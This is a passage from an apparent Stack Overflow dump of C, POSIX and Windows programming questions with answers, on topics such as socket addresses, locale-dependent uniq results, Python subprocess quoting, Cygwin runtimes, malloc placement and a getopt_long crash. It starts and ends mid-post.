        struct sockaddr_in *addr2_in = (struct sockaddr_in *)addr2;
        return (addr1_in-&gt;sin_port == addr2_in-&gt;sin_port &amp;&amp;
                addr1_in-&gt;sin_addr.s_addr == addr2_in-&gt;sin_addr.s_addr);
    ...
    // Other address families such as AF_INET6 left as an exercise
    }
}
</code></pre>

<p>Here again we make sure to pass a separate <code>socklen_t</code> pointer to receive the address length, and then I also added a loop to make sure that the actual packet we received was the one we were expecting from the intended server.  If we instead received a different packet (say, due to another peer that just happened to send us a packet at the wrong time), we ignore it.</p>

<p>The check for whether or not two socket addresses are equal is a little gnarly, since it depends on the address family, and supporting both IPv4 and IPv6 is tricky.</p>
"
"<p>I'm working with huge files of (I hope) UTF-8 text. I can reproduce it using Ubuntu 13.10 (3.11.0-14-generic) and 12.04. </p>

<p>While investigating a bug I've encountered strange behavoir </p>

<pre><code>$ export LC_ALL=en_US.UTF-8   
$ sort part-r-00000 | uniq -d 
ɥ ɨ ɞ ɧ 251
ɨ ɡ ɞ ɭ ɯ       291
ɢ ɫ ɬ ɜ 301
ɪ ɳ     475
ʈ ʂ     565

$ export LC_ALL=C
$ sort part-r-00000 | uniq -d 
$ # no duplicates found
</code></pre>

<p><del>The duplicates also appear when running a custom C++ program that reads the file using <code>std::stringstream</code> - it fails due to duplicates when using <code>en_US.UTF-8</code> locale.</del> 
C++ seems to be unaffected at least for <code>std::string</code> and input/output. </p>

<p>Why are duplicates found when using a UTF-8 locale and no duplicates are found with the C locale? </p>

<p>What transformations does the locale to the text that causes this behavoir? </p>

<p>Edit: <a href=""http://webis5.medien.uni-weimar.de/tmp/"" rel=""nofollow"">Here</a> is a small example</p>

<pre><code>$ uniq -D duplicates.small.nfc 
ɢ ɦ ɟ ɧ ɹ       224
ɬ ɨ ɜ ɪ ɟ       224
ɥ ɨ ɞ ɧ 251
ɯ ɭ ɱ ɪ 251
ɨ ɡ ɞ ɭ ɯ       291
ɬ ɨ ɢ ɦ ɟ       291
ɢ ɫ ɬ ɜ 301
ɧ ɤ ɭ ɪ 301
ɹ ɣ ɫ ɬ 301
ɪ ɳ     475
ͳ ͽ     475
ʈ ʂ     565
ˈ ϡ     565
</code></pre>

<p>Output of <code>locale</code> when the problem appears:</p>

<pre><code>$ locale 
LANG=en_US.UTF-8                                                                                                                                                                                               
LC_CTYPE=""en_US.UTF-8""                                                                                                                                                                                         
LC_NUMERIC=de_DE.UTF-8                                                                                                                                                                                         
LC_TIME=de_DE.UTF-8                                                                                                                                                                                            
LC_COLLATE=""en_US.UTF-8""                                                                                                                                                                                       
LC_MONETARY=de_DE.UTF-8                                                                                                                                                                                        
LC_MESSAGES=""en_US.UTF-8""                                                                                                                                                                                      
LC_PAPER=de_DE.UTF-8                                                                                                                                                                                           
LC_NAME=de_DE.UTF-8                                                                                                                                                                                            
LC_ADDRESS=de_DE.UTF-8                                                                                                                                                                                         
LC_TELEPHONE=de_DE.UTF-8                                                                                                                                                                                       
LC_MEASUREMENT=de_DE.UTF-8                                                                                                                                                                                     
LC_IDENTIFICATION=de_DE.UTF-8                                                                                                                                                                                  
LC_ALL=                   
</code></pre>

<p>Edit: After normalisation using: </p>

<pre><code>cat duplicates | uconv -f utf8 -t utf8 -x nfc &gt; duplicates.nfc
</code></pre>

<p>I still get the same results</p>

<p>Edit: The file is valid UTF-8 according to <code>iconv</code> - (from <a href=""http://stackoverflow.com/a/115262/772013"">here</a>)</p>

<pre><code>$ iconv -f UTF-8 duplicates -o /dev/null
$ echo $?
0
</code></pre>

<p>Edit: Looks like it something similiar to this: <a href=""http://xahlee.info/comp/unix_uniq_unicode_bug.html"" rel=""nofollow"">http://xahlee.info/comp/unix_uniq_unicode_bug.html</a>
and
<a href=""https://lists.gnu.org/archive/html/bug-coreutils/2012-07/msg00072.html"" rel=""nofollow"">https://lists.gnu.org/archive/html/bug-coreutils/2012-07/msg00072.html</a> </p>

<p>It's working on FreeBSD</p>
","9530","","<p>It could be due to <a href=""http://unicode.org/reports/tr15/"" rel=""nofollow"">Unicode normalization</a>.  There are sequences of code points in Unicode which are distinct and yet are considered equivalent.</p>

<p>One simple example of that is <a href=""https://en.wikipedia.org/wiki/Combining_character"" rel=""nofollow"">combining characters</a>.  Many accented characters like ""é"" can be represented as either a single code point (U+00E9, LATIN SMALL LETTER E WITH ACUTE), <em>or</em> as a combination of both an unaccepted character and a combining character, e.g. the two-character sequence &lt;U+0065, U+0301> (LATIN SMALL LETTER E, COMBINING ACUTE ACCENT).</p>

<p>Those two byte sequences are obviously different, and so in the C locale, they compare as different.  But in a UTF-8 locale, they're treated as identical due to Unicode normalization.</p>

<p>Here's a simple two-line file with this example:</p>

<pre><code>$ echo -e '\xc3\xa9\ne\xcc\x81' &gt; test.txt
$ cat test.txt
é
é
$ hexdump -C test.txt
00000000  c3 a9 0a 65 cc 81 0a                              |...e...|
00000007
$ LC_ALL=C uniq -d test.txt  # No output
$ LC_ALL=en_US.UTF-8 uniq -d test.txt
é
</code></pre>

<p><strong>Edit by n.m.</strong> Not all Linux systems do Unicode normalization.</p>
"
"<p>So here is the code that I am attempting to get to work:</p>

<pre><code>char* inFile = ""input.txt"";
FILE *out = fopen(""output.txt"", ""a+"");
int i = 0
while(i &lt; 5){
            int countFound = findWord(inFile, keyWord[i]);//returns count of keywords in given file
            fprintf(out, ""%s: %d\n"", keyWord[i], countFound);
            i++;
        }
fclose(out);
</code></pre>

<p>The output of this code is:</p>

<pre><code>youshouldsee1
: 3
youshouldsee2
: 3
youshouldsee3
: 3
youshouldsee4
: 3
youshouldsee5: 1
</code></pre>

<p>Expected output:</p>

<pre><code>youshouldsee1: 3
youshouldsee2: 3
youshouldsee3: 3
youshouldsee4: 3
youshouldsee5: 1
</code></pre>

<p>I don't really understand why the output is like that, shouldn't it print the string and the int then a new line? Also note that there is not a newline after the last line and there should be. I did some testing and I noticed that if I changed the <code>fprintf</code> statement to <code>fprintf(out, ""%s\n"", keyWord[i]);</code> the output is:</p>

<pre><code>youshouldsee1
youshouldsee2
youshouldsee3
youshouldsee4
youshouldsee5
</code></pre>

<p>Which is formatted much better. Again note that there is not a newline after the last line and there should be.
I noticed that while doing this with just <code>printf</code> statements I get the exact same problem, but the output is slightly more messed up.</p>

<p>Does anybody know what causes this specific issue? Much appreciated.</p>

<p>The array keyWord[] is a double pointer, I'm not sure if that makes a difference or not, but I thought that I would mention it. It is declared like so <code>char** keyWord;</code>. And it was created as follows:</p>

<pre><code>char *tempWord = ""something"";
keyWords[x] = strdup(tempWord);
</code></pre>

<p>That could be totally irrelevent but I thought it was best to mention it.</p>
","9530","","<p>You likely have some carriage return characters (<code>'\r'</code> or 0x0D) and/or backspace characters (<code>'\b'</code> or 0x08) in your <code>keyWord[i]</code> strings.</p>

<p>CRs and backspaces don't print ordinarily to terminals and instead move the terminal cursor—CRs move the cursor to the beginning of the current line, and backspaces move the cursor backwards one character.  When subsequent characters are printed, they <em>overwrite</em> what was there before.  So this code</p>

<pre><code>printf(""foobar\rbaz\n"");
</code></pre>

<p>results in this output</p>

<pre><code>bazbar
</code></pre>

<p>and this code</p>

<pre><code>printf(""foo\bbar\n"");
</code></pre>

<p>results in this output</p>

<pre><code>fobar
</code></pre>

<p>If you look at the raw bytes of the output without printing it to the terminal, you should see the CRs and backspaces plain as day.  I like to use the program <a href=""http://linux.die.net/man/1/hexdump"" rel=""nofollow""><code>hexdump(1)</code></a> to do that.  For example:</p>

<pre><code>$ echo -e 'foobar\rbaz'
bazbar
$ echo -e 'foobar\rbaz' | hexdump -C
00000000  66 6f 6f 62 61 72 0d 62  61 7a 0a                 |foobar.baz.|
0000000b
</code></pre>

<p>So I'd suggest looking at the raw data in your program's output and find out where the pesky characters are, and then figure out how to get rid of them.</p>
"
"<p>I have the following code:</p>

<pre><code>  import subprocess
    cmd = curl -X POST -H ""Content-Type: application/json"" -d '{ ""auth_token"": ""e91a0ffe758c194f0d1d5896eb4daed0"", ""widget"": ""79c08a7e70f0253c3da2fab39e7cb89b"", ""title"": ""Something"", ""text"": ""Some text"", ""moreinfo"": ""Subtitle"" }' http://collector.superviso.com
    subprocess.call(cmd)
</code></pre>

<p>I am trying to assign value to a variable which results in syntax error. Here is what happens:</p>

<pre><code>&gt;&gt;&gt; cmd = curl -X POST -H ""Content-Type: application/json"" -d '{ ""auth_token"": ""auth_token"", ""widget"": ""widget_id"", ""title"": ""Something"", ""text"": ""Some text"", ""moreinfo"": ""Subtitle"" }' http://domain.com
  File ""&lt;stdin&gt;"", line 1
    cmd = curl -X POST -H ""Content-Type: application/json"" -d '{ ""auth_token"": ""auth_token"", ""widget"": ""widget_id"", ""title"": ""Something"", ""text"": ""Some text"", ""moreinfo"": ""Subtitle"" }' http://domain.com
                     ^
SyntaxError: invalid syntax
</code></pre>

<p>Thank you in advance.</p>

<p>UPDATE01</p>

<p>The triple quote string does let me assign the value yet subproces not working</p>

<pre><code>&gt;&gt;&gt; cmd = """"""curl -X POST -H ""Content-Type: application/json"" -d '{ ""auth_token"": ""e91a0ffe758c194f0d1d5896eb4daed0"", ""widget"": ""329bdbea887ad8e10e4e496f7a60f898"", ""title"": ""Something"", ""items"":[{""label"": ""BOUGHT BREAD FOR"", ""value"": ""$999.99""}, {""label"": ""SOLD WATER FOR"", ""value"": ""$9,001.00""}] }' http://collector.superviso.com """"""
&gt;&gt;&gt; subprocess.call(cmd)
Traceback (most recent call last):
  File ""&lt;stdin&gt;"", line 1, in &lt;module&gt;
  File ""/usr/lib/python2.7/subprocess.py"", line 486, in call
    return Popen(*popenargs, **kwargs).wait()
  File ""/usr/lib/python2.7/subprocess.py"", line 672, in __init__
    errread, errwrite)
  File ""/usr/lib/python2.7/subprocess.py"", line 1201, in _execute_child
    raise child_exception
OSError: [Errno 2] No such file or directory
</code></pre>

<p>UPDATE02</p>

<p>Thanks to Adam`s post(see above) I was able to sedn the request without assigning any variable:</p>

<pre><code>subprocess.call([
    'curl',
    '-X',
    'POST',
    '-H',
    'Content-Type: application/json',
    '-d',
    '{ ""auth_token"": ""e91a0ffe758c194f0d1d5896eb4daed0"", ""widget"": ""79c08a7e70f0253c3da2fab39e7cb89b"", ""title"": ""Something"", ""text"": ""Some text"", ""moreinfo"": ""Subtitle"" }',
    'http://collector.superviso.com'
    ])
</code></pre>
","9530","","<p><code>subprocess.call</code> also takes a list of arguments instead of a single, flat argument string.  See the <a href=""http://docs.python.org/2/library/subprocess.html#frequently-used-arguments"" rel=""nofollow""><code>subprocess</code> documentation</a>.  It's much easier to use that than worry about proper quoting.  For example:</p>

<pre><code>subprocess.call([
    'curl',
    '-X',
    'POST',
    '-H',
    'Content-Type: application/json',
    '-d',
    '{ ""auth_token"": ""e91a0ffe758c194f0d1d5896eb4daed0"", ""widget"": ""79c08a7e70f0253c3da2fab39e7cb89b"", ""title"": ""Something"", ""text"": ""Some text"", ""moreinfo"": ""Subtitle"" }',
    'http://collector.superviso.com'
    ])
</code></pre>
"
"<p>I wish to port a Linux C++ application to Windows with the minimum possible effort (i.e. no code modifications at all, and no entirely new build system).</p>

<p>The application is mainly doing API calls to <code>SDL</code> and <code>OpenGL</code>, which both are available on Windows. However, it also uses <code>POSIX</code> functionality such as ptys, which are preventing me from using the <code>mingw32</code> toolchain.</p>

<p><code>Cygwin</code>, or, more precisely, <code>cygwin1.dll</code>, implements the whole <code>POSIX</code> API and internally translates it to <code>Win32</code>. I understand that <code>Cygwin</code> also comes with its own compiler suite, but to my understanding it is impossible to directly make calls to <code>Win32</code> or other Windows libraries (such as <code>SDL</code> or <code>OpenGL</code>).</p>

<p>Hence, my idea is to build the project with <code>mingw32</code> (which is conveniently also available as a cross-compiler on most distros), but in addition also link with <code>cygwin1.dll</code>. I am, however, getting suspicious by the fact that nobody on the internet seems to have tried this, and the seeming unavailability of the cygwin compiler on Linux.</p>

<p>So my question would be:</p>

<ul>
<li>Is this a legitimate idea, or will everything fail horribly even if I manage to hack it together?</li>
<li>What's the legitimate way of doing it (where do I get the cygwin headers and dll file)?</li>
</ul>

<p>Licensing is not an issue.</p>
","9530","","<p>This cannot possibly work.  The key issue is that there are two different and incompatible versions of the C runtime library (CRT) -- Cygwin's GNU library (glibc) and Microsoft's C runtime.  The MinGW toolchain uses the Microsoft CRT, while the Cygwin GCC toolchain uses the Cygwin CRT.</p>

<p>Each of these two CRTs is implemented differently.  Take the <code>malloc()</code> function, for example.  Both CRTs implement <code>malloc()</code> differently, perhaps by allocating virtual memory from the OS with <code>VirtualAlloc()</code> and then divying it up accordingly in their own manner.  If somehow you had a program which loaded both CRTs into it and you called <code>malloc()</code> from one CRT but then tried to <code>free()</code> it in another, it would crash horribly, because each CRT doesn't know how the underlying data structures work in the other.</p>

<p>So even if you managed to cobble together something here and got everything to compile and link without errors, it would still crash at runtime in ""impossible"" ways because of this fundamental incompatibility.</p>

<p>Now, what's the correct way to do things here?  You need to decide which CRT you want to use.  The Microsoft CRT does not support many POSIX features, so if you don't want to rewrite your code to avoid all of those missing POSIX features, you must use the Cygwin CRT, and you must use it for <strong>all</strong> code in your project (all source files, all static libraries, all DLLs, etc.).</p>

<p>Your understanding about Win32 is wrong -- you <em>can</em> make calls to the raw Win32 API from Cygwin programs.  The Cygwin GCC toolchain even comes with its own <code>&lt;windows.h&gt;</code> header file.  There are no restrictions against calling functions like <code>CreateFile</code>, <code>VirtualAlloc</code>, etc.</p>

<p>For other libraries you're using such as SDL and OpenGL, you need versions of those libraries which are compiled against the same CRT which you're targeting.  If you have the source code for the libraries, then you can just compile them yourselves.</p>

<p><a href=""http://www.libsdl.org/extras/win32/cygwin/README.txt"" rel=""nofollow"">Here are instructions</a> for compiling SDL for Cygwin.  For OpenGL, there are a bunch of packages you can install via Cygwin setup for getting OpenGL header files and libraries, e.g. the <code>libEGL-devel</code>, <code>libGL-devel</code>, <code>libGLU-devel</code>, <code>libglut-devel</code>, and <code>libGLw-devel</code> packages.</p>
"
"<p>I'm trying to write a client program and a server program in which when the client connects to the server, the server sends a random string from a file back to it. Here is what I have so far (reading from file omitted):</p>

<h1>server.c</h1>

<pre><code>#include &lt;sys/socket.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;signal.h&gt;

int listfd;
int connfd;

int main(int argc, char *argv[]){

    /*
    * Create Sockets
    */
    listfd = socket(AF_UNIX, SOCK_STREAM, 0);
    if(listfd == -1)
        exit(-1);

    struct sockaddr saddr = {AF_UNIX, ""server""};
    socklen_t saddrlen = sizeof(struct sockaddr) + 6;
    bind(listfd, &amp;saddr, saddrlen);

    listen(listfd, 10);

    fflush(stdout);
    printf(""Running...\n"");

    /*
    * Listen for connections
    * and send random phrase on accept
    */
    while(1){
        connfd = accept(listfd, NULL, NULL);

        int r = rand() % num_of_lines; //Pick random phrase/hint pair
        write(connfd, phrases[r], strlen(phrases[r]));

        close(connfd);
        sleep(1);
    }

    exit(0);
}
</code></pre>

<h1>client.c</h1>

<pre><code>#include &lt;sys/socket.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/ioctl.h&gt;

int main(int argc, char *argv[])
{
    int sock;
    int conn;

    struct sockaddr saddr = {AF_UNIX, ""server""};
    socklen_t saddrlen = sizeof(struct sockaddr) + 6;

    sock = socket(AF_UNIX, SOCK_STREAM, 0);

    conn = connect(sock, &amp;saddr, saddrlen);

    char BUFF[1024];

    read(sock, BUFF, 1024);

    printf(""%s"", BUFF);

    return 0;
}
</code></pre>

<p>My problem arises when I try to print in the client. I run the server, but when I run the client, it only prints garbage characters, and I'm not entirely sure what's causing this.</p>

<p>Any help would be much appreciated, thank you!</p>

<h1>EDIT:</h1>

<p>I figured out my problem. Because the server socket was bound to ""server"", which was also the name of the executable, this caused a lot of issues.</p>

<p>Renaming the sockaddr.sa_data field fixed my problem.</p>
","9530","","<p>You have a number of problems.  This is wrong:</p>

<pre><code>struct sockaddr saddr = {AF_UNIX, ""server""};
socklen_t saddrlen = sizeof(struct sockaddr) + 6;
</code></pre>

<p>You're telling the kernel ""Here's a bag of bytes representing the socket address.  It's <code>sizeof(struct sockaddr) + 6</code> bytes long"", but you're only passing in <code>sizeof(struct sockaddr)</code> bytes.  Result: the kernel reads your address out of bounds, at best causing the syscall to fail with <code>EFAULT</code>, and at worst causing the kernel to read in garbage data.</p>

<p>The correct way to setup an <code>AF_UNIX</code> socket address is with the socket address type intended for <code>AF_UNIX</code> sockets, namely <code>struct sockaddr_un</code> (see <a href=""http://linux.die.net/man/7/unix"" rel=""nofollow""><code>unix(7)</code></a>):</p>

<pre><code>struct sockaddr_un saddr = {AF_UNIX, ""/socket/path""};
bind(listfd, (struct sockaddr *)&amp;saddr, sizeof(saddr));
</code></pre>

<p>Likewise the client code which calls <code>connect(2)</code> should also set up the address in the same way.</p>

<p>Next, you need to check for errors.  Pretty much any system call here could fail, so you need to check for failures after every call and handle it appropriately (typically close the socket and/or terminate the process with an appropriate error message).</p>

<p>As you mentioned, you also need to choose an appropriate path name for the socket.  Named <code>AF_UNIX</code> sockets live in the file system and so cannot share the same name with any other file, including your server and client programs.</p>

<p>Your call to <code>read(2)</code> needs to use the return value to determine the number of bytes read.  It does NOT null-terminate its output—if it reads 4 bytes, those 4 bytes will be in your buffer, and everything else afterwards will be indeterminate.  Since <code>printf</code> expects its input to be null-terminated, you need to either explicitly null-terminate it yourself, or pass in the length, e.g.:</p>

<pre><code>int n = read(sock, BUFF, sizeof(BUFF));
if (n &lt; 0) { /* Handle error */ }
printf(""%.*s"", n, BUFF); 
</code></pre>
"
"<p>I have installed Cygwin (<code>CYGWIN_NT-6.1 AlexReynolds-PC 1.7.27(0.271/5/3) 2013-12-09 11:54 x86_64 Cygwin</code>) and GNU gcc/g++ 4.8.1. </p>

<p>I am compiling some tools that use POSIX C I/O routines, such as <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/functions/fseek.html"" rel=""nofollow""><code>fseeko()</code></a> and get a fatal error of the following sort:</p>

<pre><code> error: ‘fseeko’ was not declared in this scope
     int retValue = fseeko(stream, offset, whence);
</code></pre>

<p>Is <code>fseeko()</code> available in GNU gcc/g++ 4.8.1 on Cygwin? Are alternatives available which reliably honor a 64-bit offset, if not?</p>
","9530","","<p><code>fseeko()</code> is available on my install of Cygwin (<code>CYGWIN_NT-6.1-WOW64 1.7.25(0.270/5/3) 2013-08-31 20:39 i686 Cygwin</code>) with GCC 4.7.3.  But if your install doesn't have it for some reason, you have a couple of alternatives:</p>

<ul>
<li><a href=""http://linux.die.net/man/3/fseek"" rel=""nofollow""><code>fseek()</code></a>, with the caveat that the offset is likely limited to 32 bits instead of 64 (depending on <code>sizeof(long)</code>)</li>
<li><a href=""http://linux.die.net/man/3/fsetpos"" rel=""nofollow""><code>fsetpos()</code></a>, which takes an <code>fpos_t</code> for the offset.  However, <code>fpos_t</code> may be an opaque structure, so the only reliable way to use it is by calling <code>fgetpos()</code> to get the current position and then later call <code>fsetpos()</code> to restore the offset to the earlier position; you can't use it to seek to a particular offset otherwise.</li>
</ul>
"
"<p>I have created following things for thread</p>

<pre><code>int Data_Of_Thread_1 = 1;
int Data_Of_Thread_2 = 2;
Handle_Of_Thread_1 = 0;
Handle_Of_Thread_2 = 0;
HANDLE Array_Of_Thread_Handles[2];

Handle_Of_Thread_1 = CreateThread( NULL, 0,ModbusRead, &amp;Data_Of_Thread_1, 0, NULL);  

Handle_Of_Thread_2 = CreateThread( NULL, 0,ModbusWrite, &amp;Data_Of_Thread_2, 0, NULL);  
</code></pre>

<p>Now i have to control the execution of these two threads. The condition is as follows:</p>

<pre><code>function ModbusWrite
{
 if (condition1 true)
   {
     Pause thread1

     if(condition2 true)
           {
               resume thread1
           }
     }
 }
</code></pre>

<p>I have gone through the sites. they say synchronisation element as event, mutex, semaphore. etc. I think i have to use either event or mutex. But i am not quite clear about how to use them both. First we create either create event or create mutex then how to apply those event or mutex in my above condition. Also i am not clear about ""WaitForSingleObject"" function. where and how to implement . If anyone can help me with the code then it would be grateful. </p>
","9530","","<p>On Windows, one typically uses <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms682655%28v=vs.85%29.aspx"" rel=""nofollow"">event objects</a> to wait for conditions without wasting CPU.  If the external software you're interfacing with provides some sort of asynchronous callback mechanism, then you'd want to do something like this:</p>

<pre><code>// Create an anonymous auto-reset event, initial state unsignaled
HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
...

void ThreadProcedure()
{
    while (threadShouldContinueRunning())
    {
        // Wait until event is signaled
        WaitForSingleObject(hEvent, INFINITE);

        // Now the thread has woken up, check the condition and respond
        // accordingly
    }
}
...

void OnExternalCallback()
{
    // Called from external library when the condition becomes true -- signal
    // the worker thread to resume
    SetEvent(hEvent);
}
...

// Don't forget to cleanup
CloseHandle(hEvent);
</code></pre>

<p>Now, if the external library does <em>not</em> provide any sort of callback mechanism to inform you when the condition becomes true, you're in trouble.  In that case, the only way to detect when the condition becomes true is to continuously poll it, optionally sleeping in between to avoid burning CPU time.  The major downside of this, of course, is that you introduce unnecessary latency in detecting the condition change (the latency amount is the sleep time), or you waste a lot of CPU (and therefore power/battery life) spinning.</p>

<pre><code>void ThreadProcedure()
{
    while (threadShouldContinueRunning())
    {
        // Avoid polling if at all possible -- this adds latency and/or wastes
        // CPU and power/battery life
        if (externalConditionIsTrue())
        {
            // Handle
        }
        else
        {
            Sleep(50);  // Tune this number to balance latency vs. CPU load
        }
    }
}
</code></pre>
"
"<p>I'm supposed to read this linked list of pointers from a file.
Problem is that whenever <code>fread()</code> is called it changes not only the pointer *p, but *poly aswell, then it causes <code>addNVertex()</code> to crash the program. Read polygon method:</p>

<pre><code>Polygon* readPolygon(FILE *file){
    Polygon *poly=initPoly();
    Point p;
    int numofvertice,i;
    fread(&amp;numofvertice,sizeof(int),1,file);
    for(i=0;i&lt;numofvertice;i++){
        fread(&amp;p,sizeof(Point),1,file);
        addNVertex(poly,&amp;p,i+1);
    }
    return poly;
}
</code></pre>

<p>It is a binary file looking something like this:
<code>int,point,point...,int,point,point...</code>
The int represents the number of points to add to the polygon.</p>

<p>An example: if *poly was 0x8000 before the 2nd <code>fread()</code> (after <code>initPoly()</code>) , after the second <code>fread()</code> it changes to other value even though I read the data to &amp;p???
I've been debugging this for the past hour still nothing comes up...</p>

<p><img src=""http://i.stack.imgur.com/KCmL1.png"" alt=""The issue""></p>
","9530","","<p>This is wrong:</p>

<pre><code>Point *p=(Point*)malloc(sizeof(Point));
...
fread(&amp;p,sizeof(Point),1,file);
</code></pre>

<p>The call to <code>fread</code> reads in data from the file and stores it at the memory occupied by the pointer <code>p</code>.  <code>p</code> is a local variable on the stack and likely has a size of 4 or 8 bytes, depending on your program's bitness.  But you're reading in <code>sizeof(Point)</code> bytes; if <code>Point</code> is larger than a pointer, you're smashing the stack with a buffer overrun.</p>

<p>You really meant to write this:</p>

<pre><code>//    V-- No ""&amp;"" here
fread(p,sizeof(Point),1,file);
</code></pre>

<p>This reads the file data into <em>the memory pointed to be <code>p</code></em>, not the pointer object <code>p</code> itself.  Since you actually have <code>sizeof(Point)</code> bytes worth of data there, this does not write out of bounds.</p>

<p>You're also failing to free the memory you've allocated here, but that memory leak is an entirely separate issue.</p>
"
"<p>Check out these two C codes:</p>

<pre><code>char* char_pointer;
int* int_pointer;

char_pointer = (char*)malloc(5);
printf(""location of char_pointer: %p\n"", char_pointer);

int_pointer = (int*)malloc(10);
printf(""location of int_pointer: %p\n"", int_pointer);

free(char_pointer);

char_pointer = (char*)malloc(50);
printf(""location of char_pointer: %p\n"", char_pointer); 
</code></pre>

<p>and</p>

<pre><code>char* char_pointer;
int* int_pointer;

char_pointer = (char*)malloc(200);
printf(""location of char_pointer: %p\n"", char_pointer);

int_pointer = (int*)malloc(10);
printf(""location of int_pointer: %p\n"", int_pointer);

free(char_pointer);

char_pointer = (char*)malloc(50);
printf(""location of char_pointer: %p\n"", char_pointer); 
</code></pre>

<p>The outputs are:</p>

<pre><code>location of char_pointer: 0x23eb010
location of int_pointer: 0x23eb030
location of char_pointer: 0x23eb050
</code></pre>

<p>and</p>

<pre><code>location of char_pointer: 0x1815010
location of int_pointer: 0x18150e0
location of char_pointer: 0x1815010
</code></pre>

<p>As you see, in first program, it decided to allocate <code>char_pointer</code> after <code>int_pointer</code>(after I freeing and reallocating) but in second program it decided to allocated <code>char_pointer</code> in place of freed memory <code>0x1815010</code>.</p>

<p>The only difference between programs is the amount of memory allocated and freed.</p>

<p>So, my questions are:</p>

<p>What does the decision of allocation place depend on? (OS, compiler or hardware)</p>

<p>Why does ""it"" make a decision to allocate in place of freed memory if the amount of allocated memory is ""big""?</p>

<p>P.S. I have read about this issue in <a href=""http://rads.stackoverflow.com/amzn/click/1593271441"" rel=""nofollow"">this book</a></p>
","9530","","<p>It depends on a lot of factors, and there's no simple description to describe the behavior.  Every C runtime library implements <code>malloc()</code> differently -- you can take a look at your CRT's source code if you're curious how it works under the hood.</p>

<p>Here are some commonly used <code>malloc()</code> implementations:</p>

<ul>
<li><a href=""ftp://g.oswego.edu/pub/misc/malloc.c"" rel=""nofollow"">Doug Lea's <code>malloc</code></a> (<a href=""http://g.oswego.edu/dl/html/malloc.html"" rel=""nofollow"">description</a>)</li>
<li><a href=""http://bazaar.launchpad.net/~vcs-imports/glibc/master/view/head:/malloc/malloc.c"" rel=""nofollow"">GNU libc <code>malloc</code></a></li>
<li><a href=""http://www.malloc.de/en/"" rel=""nofollow""><code>ptmalloc</code></a></li>
<li>Microsoft CRT's <code>malloc</code>: available in <code>%PROGRAMFILES(X86)%\Microsoft Visual Studio &lt;VERSION&gt;\VC\crt\src\malloc.c</code> if you have Visual Studio installed</li>
</ul>

<p>The rough way most memory allocators work is that they keep track of available memory regions.  When a request comes in to allocate memory, they'll see if the have a memory region available that's at least as big as the request, and if so, carve up that memory, update its internal data structures to reflect that that memory is now allocated, and return the corresponding pointer.  If not enough free memory is available, the allocator will ask the OS for more virtual memory address space (typically through <a href=""http://linux.die.net/man/2/sbrk"" rel=""nofollow""><code>sbrk(2)</code></a>, <a href=""http://linux.die.net/man/2/mmap"" rel=""nofollow""><code>mmap(2)</code></a>, or <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa366887%28v=vs.85%29.aspx"" rel=""nofollow""><code>VirtualAlloc</code></a>).</p>

<p>So if a block gets allocated and then freed, and then another request of the same size (or smaller) gets requested, often (but not always), the same or a similar pointer is returned as the first block.</p>

<p>If the requested allocation is very large, the allocator may decide to skip its internal block handling and instead satisfy the request directly from the OS -- when allocating hundreds of KB or more, it's usually more efficient to just directly <code>mmap()</code> or <code>VirtualAlloc()</code> that memory, rather than try to find a free block in the list of internal free memory areas.  But not all allocators do that, and the exact breakover point is often variable.</p>
"
"<p>I'm using <code>getopt_long</code> in a program (<a href=""http://github.com/marcoms/btcwatch"" rel=""nofollow"">source here</a>), and, when testing its behaviour when given a invalid long option (<code>--stack-overflow</code>), and I get:</p>

<pre><code>[marcoms@baguette16 btcwatch]$ ./btcwatch --stack-overflow
Segmentation fault (core dumped)
</code></pre>

<p>For context, its in the <code>getopt_long()</code> loop, i.e.:</p>

<pre><code>while((opt = getopt_long(argc,
                         argv,
                         OPTSTRING,
                         long_options,
                         &amp;longopt_i)) != -1)
{

    ...

    default:
        exit(EXIT_FAILURE);
        break;
</code></pre>

<p>Instead of:</p>

<pre><code>error(EXIT_FAILURE, 0, ""unknown option !?"");
</code></pre>

<p>(The <code>exit()</code> code <code>SIGSEGV</code>s)</p>

<p><strong>The crazy thing is, <code>default</code> should not be</strong> (and is not, according to <code>gdb</code>), <strong>executed.</strong></p>

<p><code>gdb</code> shows that it crashes immediately on the <code>getopt_long()</code> call, </p>

<pre><code>(gdb) start --stack-overflow    
Temporary breakpoint 1, main (argc=2, argv=0x7fffffffe598) at src/main.c:96
96      btcdbg(""main()"");
(gdb) s
btcdbg (fmt=0x403260 ""main()"") at src/btcutil.c:50
50  }
(gdb) 
main (argc=2, argv=0x7fffffffe598) at src/main.c:118
118     const struct option long_options[] = {
(gdb) 
211     api_err.err = false;
(gdb) 
212     colour = false;
(gdb) 
213     found_path = false;
(gdb) 
214     fp = NULL;
(gdb) 
215     n = 1.0;
(gdb) 
216     newlp = NULL;
(gdb) 
217     pn = argv[0];
(gdb) 
218     reverse = false;
(gdb) 
219     verbose = false;
(gdb) 
221     strcpy(currcy, ""USD"");
(gdb) 
223     setlocale(LC_ALL, """");  // sets the locale to the system's default
(gdb) 
225     while((opt = getopt_long(
(gdb) 

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7643e2c in __strncmp_sse2 () from /usr/lib/libc.so.6
</code></pre>

<p>But when it is run with <code>error()</code> instead of <code>exit()</code>, it proceeds normally:</p>

<pre><code>(gdb) start --stack-overflow
Temporary breakpoint 1, main (argc=2, argv=0x7fffffffe598) at src/main.c:96
96      btcdbg(""main()"");
(gdb) s
btcdbg (fmt=0x4032a0 ""main()"") at src/btcutil.c:50
50  }
(gdb) 
main (argc=2, argv=0x7fffffffe598) at src/main.c:118
118     const struct option long_options[] = {
(gdb) 
211     api_err.err = false;
(gdb) 
212     colour = false;
(gdb) 
213     found_path = false;
(gdb) 
214     fp = NULL;
(gdb) 
215     n = 1.0;
(gdb) 
216     newlp = NULL;
(gdb) 
217     pn = argv[0];
(gdb) 
218     reverse = false;
(gdb) 
219     verbose = false;
(gdb) 
221     strcpy(currcy, ""USD"");
(gdb) 
223     setlocale(LC_ALL, """");  // sets the locale to the system's default
(gdb) 
225     while((opt = getopt_long(
(gdb) 
